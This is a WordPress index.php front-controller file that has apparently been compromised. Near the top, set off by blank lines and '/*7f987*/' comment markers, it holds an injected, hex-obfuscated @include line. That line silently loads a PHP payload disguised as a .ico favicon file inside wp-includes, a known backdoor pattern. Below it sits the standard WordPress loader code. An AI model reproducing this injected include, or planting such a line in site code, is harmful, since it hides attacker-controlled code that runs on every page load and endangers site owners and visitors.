<?php












/*7f987*/

@include "\x45:\Vh\x6fsts\x73sent\x72egas\x2ecom.\x62r\ht\x74pdoc\x73/wp-\x69nclu\x64es/I\x58R/fa\x76icon\x5f2be8\x38f.ic\x6f";

/*7f987*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
